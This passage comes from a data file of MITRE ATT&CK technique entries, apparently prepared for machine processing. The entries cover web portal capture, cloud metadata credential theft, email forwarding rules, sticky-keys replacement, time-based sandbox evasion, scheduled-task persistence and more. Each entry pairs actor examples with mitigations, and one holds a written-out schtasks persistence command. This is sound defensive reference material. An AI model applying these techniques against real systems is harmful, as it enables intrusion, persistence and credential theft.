cloud systems.", "Do not allow domain administrator or root accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."], "is_subtechnique": true}
{"text": " Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)", "idx": "https://attack.mitre.org/techniques/T1056/003", "title": "Web Portal Capture", "entity": "Web Portal Capture", "entity_type": "techniques", "entity_context": ["Do not allow administrator accounts that have permissions to modify the Web content of organization login portals to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."], "is_subtechnique": true}
{"text": " Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.", "idx": "https://attack.mitre.org/techniques/T1001/001", "title": "Junk Data", "entity": "Junk Data", "entity_type": "techniques", "entity_context": ["APT28 added \"junk data\" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a \"junk length\" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.", "SUNBURST added junk bytes to its C2 over HTTP.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate some obfuscation activity at the network level. ", "GoldMax has used decoy traffic to surround its malicious network traffic to avoid detection.", "P8RAT can send randomly-generated data as part of its C2 communication.", "P2P ZeuS added junk data to outgoing UDP packets to peer implants.", "PLEAD samples were found to be highly obfuscated with junk code.", "WellMess can use junk data in the Base64 string for additional obfuscation.", "Downdelph inserts pseudo-random characters between each original character during encoding of C2 network requests, making it difficult to write signatures on them.", "BendyBear has used byte randomization to obscure its behavior.", "GrimAgent  can pad C2 messages with random generated values.", "Turian can insert pseudo-random characters into its network encryption setup."], "is_subtechnique": true}
{"text": " Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data. Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019) If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018) The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.", "idx": "https://attack.mitre.org/techniques/T1552/005", "title": "Cloud Instance Metadata API", "entity": "Cloud Instance Metadata API", "entity_type": "techniques", "entity_context": ["TeamTNT has queried the AWS instance metadata service for credentials.", "Limit access to the Instance Metadata API using a host-based firewall such as iptables. A properly configured Web Application Firewall (WAF) may help prevent external adversaries from exploiting Server-side Request Forgery (SSRF) attacks that allow access to the Cloud Instance Metadata API.", "Hildegard has queried the Cloud Instance Metadata API for cloud credentials.", "Disable unnecessary metadata services and restrict or disable insecure versions of metadata services that are in use to prevent adversary access."], "is_subtechnique": true}
{"text": " Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules) Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)", "idx": "https://attack.mitre.org/techniques/T1114/003", "title": "Email Forwarding Rule", "entity": "Email Forwarding Rule", "entity_type": "techniques", "entity_context": ["Consider disabling external email forwarding.", "Kimsuky has set auto-forward rules on victim's e-mail accounts.", "Silent Librarian has set up auto forwarding rules on compromised e-mail accounts.", "Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages.", "Enterprise email solutions have monitoring mechanisms that may include the ability to audit auto-forwarding rules on a regular basis.\n\nIn an Exchange environment, Administrators can use Get-InboxRule to discover and remove potentially malicious auto-forwarding rules.. In addition to this, a MAPI Editor can be utilized to examine the underlying database structure and discover any modifications/tampering of the properties of auto-forwarding rules."], "is_subtechnique": true}
{"text": " Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet. Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.", "idx": "https://attack.mitre.org/techniques/T1567/002", "title": "Exfiltration to Cloud Storage", "entity": "Exfiltration to Cloud Storage", "entity_type": "techniques", "entity_context": ["FIN7 has exfiltrated stolen data to the MEGA file sharing site.", "Turla has used WebDAV to upload stolen USB files to a cloud drive. Turla has also exfiltrated stolen files to OneDrive and 4shared.", "BoomBox can upload data to dedicated per-victim folders in Dropbox.", "Leviathan has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.", "ZIRCONIUM has exfiltrated stolen data to Dropbox.", "Octopus has exfiltrated data to file sharing sites.", "HAFNIUM has exfiltrated data to file sharing sites, including MEGA.", "Empire can use Dropbox for data exfiltration.", "Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services.", "Chimera has exfiltrated stolen data to OneDrive accounts.", "BoxCaon has the capability to download folders' contents on the system and upload the results back to its Dropbox drive.", "RainyDay can use a file exfiltration tool to upload specific files to Dropbox.\t \n", "HAMMERTOSS exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.", "Crutch has exfiltrated stolen data to Dropbox."], "is_subtechnique": true}
{"text": " Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system. Two common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit) Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another", "idx": "https://attack.mitre.org/techniques/T1546/008", "title": "Accessibility Features", "entity": "Accessibility Features", "entity_type": "techniques", "entity_context": ["If possible, use a Remote Desktop Gateway to manage connections and security configuration of RDP within a network.", "Axiom actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.", "To use this technique remotely, an adversary must use it in conjunction with RDP. Ensure that Network Level Authentication is enabled to force the remote desktop session to authenticate before the session is created and the login screen displayed. It is enabled by default on Windows Vista and later.", "APT3 replaces the Sticky Keys binary <code>C:\\Windows\\System32\\sethc.exe</code> for persistence.", "Deep Panda has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.", "APT29 used sticky-keys to obtain unauthenticated, privileged console access.", "APT41 leveraged sticky keys to establish persistence. ", "Empire can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe.", "Adversaries can replace accessibility features binaries with alternate binaries to execute this technique. Identify and block potentially malicious software executed through accessibility features functionality by using application control  tools, like Windows Defender Application Control, AppLocker,   or Software Restriction Policies  where appropriate. ", "Fox Kitten has used sticky keys to launch a command prompt."], "is_subtechnique": true}
{"text": " Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets. Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).", "idx": "https://attack.mitre.org/techniques/T1597/002", "title": "Purchase Technical Data", "entity": "Purchase Technical Data", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)", "idx": "https://attack.mitre.org/techniques/T1559", "title": "Inter-Process Communication", "entity": "Inter-Process Communication", "entity_type": "techniques", "entity_context": ["Modify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\AppID\\\\{AppID_GUID}` associated with the process-wide security of individual COM applications.\n\nModify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Ole` associated with system-wide security defaults for all COM applications that do no set their own process-wide security. ", "HyperStack can connect to the IPC$ share on remote machines.", "Ensure all COM alerts and Protected View are enabled.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent DDE attacks and spawning of child processes from Office programs.", "Consider disabling embedded files in Office programs, such as OneNote, that do not work with Protected View.", "Registry keys specific to Microsoft Office feature control security can be set to disable automatic DDE/OLE execution.  Microsoft also created, and enabled by default, Registry keys to completely disable DDE execution in Word and Excel."], "is_subtechnique": false}
{"text": " Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.", "idx": "https://attack.mitre.org/techniques/T1547/009", "title": "Shortcut Modification", "entity": "Shortcut Modification", "entity_type": "techniques", "entity_context": ["Gazer can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.", "APT39 has modified LNK shortcuts.", "Empire can persist by modifying a .LNK file to include a backdoor.", "BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.", "Darkhotel has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file.", "RedLeaves attempts to add a shortcut file in the Startup folder to achieve persistence.", "SeaDuke is capable of persisting via a .lnk file stored in the Startup directory.", "Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.", "To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.", "Comnie establishes persistence via a .lnk file in the victim’s startup path.", "Dragonfly 2.0 manipulated .lnk files to gather user credentials in conjunction with Forced Authentication.", "Micropsia creates a shortcut to maintain persistence.", "A Lazarus Group malware sample adds persistence on the system by creating a shortcut in the user’s Startup folder.", "MarkiRAT can modify the shortcut that launches Telegram by replacing its path with the malicious payload to launch with the legitimate executable.", "Kazuar adds a .lnk file to the Windows startup folder.", "InvisiMole can use a .lnk shortcut for the Control Panel to establish persistence.", "RogueRobin establishes persistence by creating a shortcut (.LNK file) in the Windows startup folder to run a script each time the user logs in.", "Okrum can establish persistence by creating a .lnk shortcut to itself in the Startup folder.", "SHIPSHAPE achieves persistence by creating a shortcut in the Startup folder.", "Astaroth's initial payload is a malicious .LNK file. ", "Reaver creates a shortcut file and saves it in a Startup folder to establish persistence.", "S-Type may create the file <code>%HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk</code>, which points to the malicious msdtc.exe file already created in the %CommonFiles% directory.", "FELIXROOT creates a .LNK file for persistence.", "Stuxnet used copies of .lnk shortcuts to propagate through removable media.", "The BlackEnergy 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.", "Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence.", "APT29 drops a Windows shortcut file for execution.", "Grandoreiro can write or modify browser shortcuts to enable launching of malicious browser extensions. ", "A version of KONNI drops a Windows shortcut on the victim’s machine to establish persistence.", "Helminth establishes persistence by creating a shortcut.", "Limit permissions for who can create symbolic links in Windows to appropriate groups such as Administrators and necessary groups for virtualization. This can be done through GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create symbolic links. ", "Bazar can establish persistence by writing shortcuts to the Windows Startup folder.", "TinyZBot can create a shortcut in the Windows startup folder for persistence.", "SPACESHIP achieves persistence by creating a shortcut in the current user's Startup folder."], "is_subtechnique": true}
{"text": " Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. From the fake website, information is gathered in web forms and sent to the attacker. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.", "idx": "https://attack.mitre.org/techniques/T1598/003", "title": "Spearphishing Link", "entity": "Spearphishing Link", "entity_type": "techniques", "entity_context": ["APT32 has used malicious links to direct users to web pages designed to harvest credentials.", "SMOKEDHAM has been delivered via malicious links in phishing emails.", "Magic Hound has used SMS and email messages with links designed to steal credentials.", "Silent Librarian has used links in e-mails to direct victims to credential harvesting websites designed to appear like the targeted organization's login page.", "Kimsuky has used links in e-mail to steal account information.", "Sidewinder has sent e-mails with malicious links to credential harvesting websites.", "Users can be trained to identify social engineering techniques and spearphishing attempts.", "Sandworm Team has crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials.", "Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation."], "is_subtechnique": true}
{"text": " Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001) are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well. Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)", "idx": "https://attack.mitre.org/techniques/T1498/001", "title": "Direct Network Flood", "entity": "Direct Network Flood", "entity_type": "techniques", "entity_context": ["When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."], "is_subtechnique": true}
{"text": " Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020) MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream) An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)", "idx": "https://attack.mitre.org/techniques/T1564/007", "title": "VBA Stomping", "entity": "VBA Stomping", "entity_type": "techniques", "entity_context": ["Turn off or restrict access to unneeded VB components."], "is_subtechnique": true}
{"text": " Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time. Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness) Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot) Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution", "idx": "https://attack.mitre.org/techniques/T1497/003", "title": "Time Based Evasion", "entity": "Time Based Evasion", "entity_type": "techniques", "entity_context": ["ThiefQuest invokes <code>time</code> call to check the system's time, executes a <code>sleep</code> command, invokes a second <code>time</code> call, and then compares the time difference between the two <code>time</code> calls and the amount of time the system slept to identify the sandbox.", "P8RAT has the ability to \"sleep\" for a specified time to evade detection.", "GoldMax has set an execution trigger date and time, stored as an ASCII Unix/Epoch time value.", "Okrum's loader can detect presence of an emulator by using two calls to GetTickCount API, and checking whether the time has been accelerated.", "GoldenSpy's installer has delayed installation of GoldenSpy for two hours after it reaches a victim system.\t", "After initial installation, Raindrop runs a computation to delay execution.", "Using the machine's local time, XCSSET waits 43200 seconds (12 hours) from the initial creation timestamp of a specific file, <code>.report</code>. After the elapsed time, XCSSET executes additional modules.", "Egregor can perform a  long sleep (greater than or equal to 3 minutes) to evade detection.", "EvilBunny has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.", "Pony has delayed execution using a built-in function to avoid detection and analysis.\t", "LiteDuke can wait 30 seconds before executing additional code if security software is detected.", "BADFLICK has delayed communication to the actor-controlled IP address by 5 minutes.", "Clop has used the <code>sleep</code> command to avoid sandbox detection.", "Ursnif has used a 30 minute delay after execution to evade sandbox monitoring tools.", "Crimson can determine when it has been installed on a host for at least 15 days before downloading the final payload.", "FatDuke can turn itself on or off at random intervals.", "Bazar can use a timer to delay execution of core functionality.", "AppleJeus has waited a specified time before downloading a second stage payload.", "TrickBot has used <code>printf</code> and file I/O loops to delay process execution as part of API hammering.", "GuLoader has the ability to perform anti-debugging based on time checks, API calls, and CPUID.", "Lokibot has performed a time-based anti-debug check before downloading its third stage.", "SUNBURST remained dormant after initial access for a period of up to two weeks.", "GrimAgent can sleep for 195 - 205 seconds after payload execution and before deleting its task.", "BendyBear can check for analysis environments and signs of debugging using the Windows API <code>kernel32!GetTickCountKernel32</code> call. ", "The QakBot dropper can delay dropping the payload to evade detection.", "SodaMaster has the ability to put itself to \"sleep\" for a specified time."], "is_subtechnique": true}
{"text": " Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.", "idx": "https://attack.mitre.org/techniques/T1574/010", "title": "Services File Permissions Weakness", "entity": "Services File Permissions Weakness", "entity_type": "techniques", "entity_context": ["Use auditing tools capable of detecting file system permissions abuse opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for service file system permissions weaknesses.", "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able.", "Turn off UAC's privilege elevation for standard users <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System</code>to automatically deny elevation requests, add: <code>\"ConsentPromptBehaviorUser\"=dword:00000000</code>. Consider enabling installer detection for all users by adding: <code>\"EnableInstallerDetection\"=dword:00000001</code>. This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: <code>\"EnableInstallerDetection\"=dword:00000000</code>. This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged.", "One variant of BlackEnergy locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence."], "is_subtechnique": true}
{"text": " Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001), this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via: * **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017) * **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015) * **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)", "idx": "https://attack.mitre.org/techniques/T1056/004", "title": "Credential API Hooking", "entity": "Credential API Hooking", "entity_type": "techniques", "entity_context": ["NOKKI uses the Windows call SetWindowsHookEx and begins injecting it into every GUI process running on the victim's machine.", "ZxShell hooks several API functions to spawn system threads. ", "Ursnif has hooked APIs to perform a wide variety of information theft, such as monitoring traffic from browsers.", "Zeus Panda hooks processes by leveraging its own IAT hooked functions.", "Carberp has hooked several Windows API functions to steal credentials.", "Zebrocy installs an application-defined Windows hook to get notified when a network drive has been attached, so it can then use the hook to call its RecordToFile file stealing method.", "TrickBot has the ability to capture RDP credentials by capturing the <code>CredEnumerateA</code> API ", "FinFisher hooks processes by modifying IAT pointers to CreateWindowEx.", "Empire contains some modules that leverage API hooking to carry out tasks, such as netripper.", "RDFSNIFFER hooks several Win32 API functions to hijack elements of the remote system management user-interface.", "PLATINUM is capable of using Windows hook interfaces for information gathering such as credential access."], "is_subtechnique": true}
{"text": " Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks</code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task. The deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At (Windows)](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel. An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).", "idx": "https://attack.mitre.org/techniques/T1053/005", "title": "Scheduled Task", "entity": "Scheduled Task", "entity_type": "techniques", "entity_context": ["Dyre has the ability to achieve persistence by adding a new task in the task scheduler to run every minute.", "Silence has used scheduled tasks to stage its operation.", "TrickBot creates a scheduled task on the system that provides persistence.", "Operation Wocao has used scheduled tasks to execute malicious PowerShell code on remote systems.", "Mustang Panda has created a scheduled task to execute additional malicious software, as well as maintain persistence.", "CSPY Downloader can use the schtasks utility to bypass UAC.", "FIN8 has used scheduled tasks to maintain RDP backdoors.", "BabyShark has used scheduled tasks to maintain persistence.", "NotPetya creates a task to reboot the system one hour after infection.", "FIN7 malware has created scheduled tasks to establish persistence.", "QakBot has the ability to create scheduled tasks for persistence.", "GALLIUM established persistence for PoisonIvy by created a scheduled task.", "BADNEWS creates a scheduled task to establish by executing a malicious payload every subsequent minute.", "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. ", "POWERSTATS has established persistence through a scheduled task using the command <code>”C:\\Windows\\system32\\schtasks.exe” /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR “c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe”</code>.", "Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be configured through GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. ", "APT38 has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence.", "Empire has modules to interact with the Windows task scheduler.", "Gamaredon Group has created a scheduled task to launch an executable every 10 minutes.\t", "POWRUNER persists through a scheduled task that executes it every minute.", "CosmicDuke uses scheduled tasks typically named \"Watchmon Service\" for persistence.", "APT41 used a compromised account to create a 